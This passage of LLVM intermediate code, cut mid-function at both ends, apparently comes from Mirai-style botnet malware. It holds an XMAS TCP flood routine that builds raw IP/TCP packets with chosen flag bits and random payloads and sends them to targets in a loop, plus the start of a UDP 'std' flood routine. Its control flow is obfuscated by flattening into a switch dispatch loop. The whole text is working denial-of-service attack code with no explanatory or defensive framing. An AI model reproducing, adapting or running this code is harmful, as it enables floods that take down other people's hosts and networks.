  %267 = call i32 @ntohl(i32 %266) #8
  %268 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %271, i32 0, i32 1
  store i32 %267, i32* %272, align 4
  %273 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 3
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #8
  %277 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %280, i32 0, i32 2
  store i32 %276, i32* %281, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 1
  %284 = load i16, i16* %283, align 2
  %285 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %288, i32 0, i32 3
  store i16 %284, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %295, i32 0, i32 4
  store i16 %291, i16* %296, align 2
  %297 = load i32, i32* %24, align 4
  %298 = sext i32 %297 to i64
  %299 = add i64 40, %298
  %300 = call noalias i8* @malloc(i64 %299) #7
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  store i8* %300, i8** %304, align 8
  %305 = load i8**, i8*** %12, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8*, i8** %305, i64 %307
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %36, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %37, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i64 1
  %316 = bitcast %struct.tcphdr* %315 to i8*
  store i8* %316, i8** %38, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = bitcast %struct.iphdr* %317 to i8*
  %319 = load i8, i8* %318, align 4
  %320 = and i8 %319, 15
  %321 = or i8 %320, 64
  store i8 %321, i8* %318, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = and i8 %324, -16
  %326 = or i8 %325, 5
  store i8 %326, i8* %323, align 4
  %327 = load i8, i8* %13, align 1
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 1
  store i8 %327, i8* %329, align 1
  %330 = load i32, i32* %24, align 4
  %331 = sext i32 %330 to i64
  %332 = add i64 40, %331
  %333 = trunc i64 %332 to i16
  %334 = call zeroext i16 @htons(i16 zeroext %333) #8
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 2
  store i16 %334, i16* %336, align 2
  %337 = load i16, i16* %14, align 2
  %338 = call zeroext i16 @htons(i16 zeroext %337) #8
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load i8, i8* %15, align 1
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i8 %341, i8* %343, align 4
  %344 = load i8, i8* %16, align 1
  %345 = icmp ne i8 %344, 0
  %346 = select i1 %345, i32 -568767414, i32 -1197172176
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 4
  store i16 %348, i16* %350, align 2
  store i32 -1197172176, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 6
  store i8 6, i8* %353, align 1
  %354 = load i32, i32* @LOCAL_ADDR, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  %357 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 9
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %368, i32 0, i32 3
  %370 = load i16, i16* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 4
  %373 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 2
  %379 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %384, i32 0, i32 2
  %386 = load i32, i32* %385, align 4
  %387 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 2
  store i32 %386, i32* %388, align 4
  %389 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %392, i32 0, i32 1
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 3
  store i32 %394, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -241
  %401 = or i16 %400, 128
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -257
  %406 = or i16 %405, 256
  store i16 %406, i16* %403, align 4
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %409, -4097
  %411 = or i16 %410, 4096
  store i16 %411, i16* %408, align 4
  %412 = call i32 @rand_next()
  %413 = and i32 %412, 65535
  %414 = trunc i32 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 5
  store i16 %414, i16* %416, align 2
  %417 = load i8, i8* %18, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = and i16 %418, 1
  %423 = shl i16 %422, 13
  %424 = and i16 %421, -8193
  %425 = or i16 %424, %423
  store i16 %425, i16* %420, align 4
  %426 = load i8, i8* %19, align 1
  %427 = sext i8 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = and i16 %427, 1
  %432 = shl i16 %431, 12
  %433 = and i16 %430, -4097
  %434 = or i16 %433, %432
  store i16 %434, i16* %429, align 4
  %435 = load i8, i8* %20, align 1
  %436 = sext i8 %435 to i16
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = and i16 %436, 1
  %441 = shl i16 %440, 11
  %442 = and i16 %439, -2049
  %443 = or i16 %442, %441
  store i16 %443, i16* %438, align 4
  %444 = load i8, i8* %21, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = and i16 %445, 1
  %450 = shl i16 %449, 10
  %451 = and i16 %448, -1025
  %452 = or i16 %451, %450
  store i16 %452, i16* %447, align 4
  %453 = load i8, i8* %22, align 1
  %454 = sext i8 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = and i16 %454, 1
  %459 = shl i16 %458, 9
  %460 = and i16 %457, -513
  %461 = or i16 %460, %459
  store i16 %461, i16* %456, align 4
  %462 = load i8, i8* %23, align 1
  %463 = sext i8 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %463, 1
  %468 = shl i16 %467, 8
  %469 = and i16 %466, -257
  %470 = or i16 %469, %468
  store i16 %470, i16* %465, align 4
  %471 = load i8*, i8** %38, align 8
  %472 = load i32, i32* %24, align 4
  call void @rand_str(i8* %471, i32 %472)
  store i32 -1973399813, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = lshr i16 %476, 8
  %478 = and i16 %477, 1
  %479 = zext i16 %478 to i32
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -358556419, i32 -383044223
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = lshr i16 %485, 10
  %487 = and i16 %486, 1
  %488 = zext i16 %487 to i32
  %489 = icmp ne i32 %488, 0
  %490 = select i1 %489, i32 -358556419, i32 -411944879
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %26, align 4
  %493 = call i32 @close(i32 %492)
  store i32 -1401735070, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 1313248056, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 986126337, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 1345555399, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #7
  %499 = load i64, i64* %31, align 8
  %500 = sub nsw i64 %498, %499
  %501 = icmp sgt i64 %500, 10
  %502 = select i1 %501, i32 1124592669, i32 1416161389
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %26, align 4
  %505 = call i32 @close(i32 %504)
  store i32 -1401735070, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 1590073004, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 -1303715687, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %9, align 4
  store i32 740156475, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 1573087811, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1011804493, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %9, align 4
  %515 = load i8, i8* %5, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %514, %516
  %518 = select i1 %517, i32 2134650425, i32 -921495019
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %12, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds i8*, i8** %520, i64 %522
  %524 = load i8*, i8** %523, align 8
  store i8* %524, i8** %39, align 8
  %525 = load i8*, i8** %39, align 8
  %526 = bitcast i8* %525 to %struct.iphdr*
  store %struct.iphdr* %526, %struct.iphdr** %40, align 8
  %527 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i64 1
  %529 = bitcast %struct.iphdr* %528 to %struct.tcphdr*
  store %struct.tcphdr* %529, %struct.tcphdr** %41, align 8
  %530 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i64 1
  %532 = bitcast %struct.tcphdr* %531 to i8*
  store i8* %532, i8** %42, align 8
  %533 = load i16, i16* %14, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  %536 = select i1 %535, i32 -1625676269, i32 648500167
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i32 @rand_next()
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 4
  store i32 648500167, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %25, align 1
  %545 = icmp ne i8 %544, 0
  %546 = select i1 %545, i32 -813634231, i32 461323258
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %42, align 8
  %549 = load i32, i32* %24, align 4
  call void @rand_str(i8* %548, i32 %549)
  store i32 461323258, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %558, i64 %560
  %562 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %561, i32 0, i32 1
  %563 = load i32, i32* %562, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %562, align 4
  %565 = trunc i32 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #8
  %567 = zext i16 %566 to i32
  %568 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 2
  store i32 %567, i32* %569, align 4
  %570 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %573, i32 0, i32 2
  %575 = load i32, i32* %574, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #8
  %578 = zext i16 %577 to i32
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  %581 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 6
  store i16 0, i16* %582, align 4
  %583 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %584 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %585 = bitcast %struct.tcphdr* %584 to i8*
  %586 = load i32, i32* %24, align 4
  %587 = sext i32 %586 to i64
  %588 = add i64 20, %587
  %589 = trunc i64 %588 to i16
  %590 = call zeroext i16 @htons(i16 zeroext %589) #8
  %591 = load i32, i32* %24, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 20, %592
  %594 = trunc i64 %593 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %590, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %39, align 8
  %609 = load i32, i32* %24, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %607, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %620, i32 16)
  store i32 -2018160118, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %9, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %9, align 4
  store i32 1011804493, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 1573087811, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %625, %622, %550, %547, %543, %537, %519, %513, %512, %511, %508, %507, %506, %503, %497, %496, %495, %494, %491, %482, %473, %351, %347, %255, %246, %237, %224, %219, %210, %209, %197, %189, %185, %180, %175, %166, %145, %129, %128, %124, %123, %117, %116, %113, %107, %106, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2027127839, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2027127839, label %first
    i32 -851054305, label %52
    i32 1674160367, label %55
    i32 846583558, label %58
    i32 -849144575, label %59
    i32 -1230430651, label %65
    i32 -638833188, label %75
    i32 -475032979, label %84
    i32 1564388665, label %93
    i32 451993870, label %101
    i32 -115844216, label %102
    i32 -960831587, label %120
    i32 -1395659304, label %121
    i32 -637309357, label %131
    i32 -424036325, label %157
    i32 1215309582, label %175
    i32 1076689718, label %176
    i32 -1625333119, label %177
    i32 1870248859, label %180
    i32 943416590, label %181
    i32 1291921024, label %182
    i32 -1828000714, label %188
    i32 1786381290, label %197
    i32 -937069212, label %201
    i32 1669347542, label %211
    i32 -1650053731, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 -851054305, i32 1674160367
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 846583558, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #8
  store i16 %57, i16* %13, align 2
  store i32 846583558, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -849144575, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 -1230430651, i32 1870248859
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 -638833188, i32 -475032979
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
